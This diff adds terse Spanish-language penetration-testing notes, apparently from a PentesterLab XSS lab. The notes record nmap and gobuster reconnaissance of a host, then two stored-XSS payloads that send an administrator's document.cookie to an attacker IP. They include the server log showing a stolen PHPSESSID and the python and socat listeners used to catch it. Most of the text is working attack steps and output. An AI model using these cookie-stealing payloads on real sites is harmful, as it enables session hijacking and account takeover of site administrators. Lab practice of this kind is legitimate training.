@@ -1,0 +1,75 @@
+nmap -sV 182.168.0.30
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.5p1 Debian 6+squeeze4 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.2.16 ((Debian))
+
+gobuster dir -u http://192.168.0.30/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
+
+/images (Status: 301)
+/index (Status: 200)
+/index.php (Status: 200)
+/header (Status: 200)
+/header.php (Status: 200)
+/admin (Status: 301)
+/footer (Status: 200)
+/footer.php (Status: 200)
+/post (Status: 200)
+/post.php (Status: 200)
+/all (Status: 200)
+/all.php (Status: 200)
+/css (Status: 301)
+/classes (Status: 301)
+/favicon (Status: 200)
+/post_comment (Status: 302)
+/post_comment.php (Status: 302)
+
+----------------------------------------------- Robo de Cookie para administrador -------------------------------------------------
+
+python3 -m http.server 80
+
+<script type="text/javascript">
+document.location="http://192.168.0.23/tu_cookie.php?c="+document.cookie;
+</script>
+
+192.168.0.30 - - [30/Mar/2020 16:50:05] "GET /tu_cookie.php?c=PHPSESSID=4rss4ir2qqipd0phs49heoir13 HTTP/1.1"
+
+sudo netstat -tulpn | grep :80 = para ver si el puerto esa en uso
+
+fuser -k -n tcp 80
+
+https://pentesterlab.com/exercises/xss_and_mysql_file/course
+
+---------------------------------------------- Segunda Forma Cookie ------------------------------------------------------------------
+
+<script>document.write('<img src="http://192.168.0.23/?'+document.cookie+'  "/>');</script>
+
+socat TCP-LISTEN:80,reuseaddr,fork -
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
